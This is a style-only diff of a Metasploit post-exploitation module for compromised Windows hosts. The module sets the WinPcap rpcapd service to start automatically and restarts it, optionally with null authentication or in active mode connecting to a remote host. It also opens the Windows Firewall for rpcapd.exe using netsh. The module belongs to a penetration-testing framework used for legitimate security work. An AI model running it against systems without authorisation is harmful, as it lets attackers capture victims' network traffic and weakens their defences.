@@ -9,33 +9,38 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Services
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Remote Packet Capture Service Starter',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Remote Packet Capture Service Starter',
+        'Description' => %q{
           This module enables the Remote Packet Capture System (rpcapd service)
-        included in the default installation of Winpcap. The module allows you to set up
-        the service in passive or active mode (useful if the client is behind a firewall).
-        If authentication is enabled you need a local user account to capture traffic.
-        PORT will be used depending of the mode configured.},
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
-      'Platform'      => 'win',
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+          included in the default installation of Winpcap. The module allows you to set up
+          the service in passive or active mode (useful if the client is behind a firewall).
+          If authentication is enabled you need a local user account to capture traffic.
+          PORT will be used depending of the mode configured.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
+        'Platform' => 'win',
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
 
     register_options(
       [
         OptBool.new('NULLAUTH', [ true, 'Enable Null Authentication.', true]),
-        OptBool.new('ACTIVE',   [ true, 'Enable rpcapd in active mode (passive by default).', false]),
-        OptAddress.new('RHOST',	 [ false, 'Remote host to connect (set in active mode only).']),
-        OptInt.new('PORT',    [ true,  'Local/Remote port to capture traffic.',2002])
-      ])
+        OptBool.new('ACTIVE', [ true, 'Enable rpcapd in active mode (passive by default).', false]),
+        OptAddress.new('RHOST', [ false, 'Remote host to connect (set in active mode only).']),
+        OptInt.new('PORT', [ true, 'Local/Remote port to capture traffic.', 2002])
+      ]
+    )
   end
 
   def run
     if is_admin?
-      serv = service_info("rpcapd")
+      serv = service_info('rpcapd')
       print_status("Checking if machine #{sysinfo['Computer']} has rpcapd service")
 
       if serv[:display] !~ /remote/i
@@ -44,14 +49,14 @@ class MetasploitModule < Msf::Post
         print_status("Rpcap service found: #{serv[:display]}")
 
         start_type = serv[:starttype]
-        prog = get_env('ProgramFiles') << "\\winpcap\\rpcapd.exe"
+        prog = get_env('ProgramFiles') << '\\winpcap\\rpcapd.exe'
         if start_type != START_TYPE_AUTO
           print_status("Setting rpcapd as 'auto' service")
-          service_change_startup("rpcapd", START_TYPE_AUTO)
+          service_change_startup('rpcapd', START_TYPE_AUTO)
         end
         if datastore['ACTIVE']
           if datastore['RHOST'].nil?
-            print_error("RHOST is not set ")
+            print_error('RHOST is not set ')
             return
           else
             p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
@@ -63,7 +68,7 @@ class MetasploitModule < Msf::Post
           p = prog << " -d -p #{datastore['PORT']} "
         end
         if datastore['NULLAUTH']
-          p<< "-n"
+          p << '-n'
         end
         run_rpcapd(p)
       end
@@ -73,12 +78,12 @@ class MetasploitModule < Msf::Post
   end
 
   def run_rpcapd(p)
-    service_name = "rpcapd"
+    service_name = 'rpcapd'
     begin
       if service_restart(service_name)
         print_good("Rpcapd started successfully: #{p}")
       else
-        print_error("There was an error restarting rpcapd.exe.")
+        print_error('There was an error restarting rpcapd.exe.')
       end
     rescue ::Exception => e
       print_error("The following Error was encountered: #{e.class} #{e}")
@@ -86,14 +91,14 @@ class MetasploitModule < Msf::Post
   end
 
   def fw_enable(prog)
-    print_status("Enabling rpcapd.exe in Windows Firewall")
+    print_status('Enabling rpcapd.exe in Windows Firewall')
     begin
       if file_exist?(prog)
-        cmd_exec("netsh","firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ",30)
+        cmd_exec('netsh', "firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ", 30)
       else
         print_error("rpcad.exe doesn't exist in #{prog}. Check the installation of WinPcap")
       end
-    rescue::Exception => e
+    rescue ::Exception => e
       print_status("The following Error was encountered: #{e.class} #{e}")
     end
   end
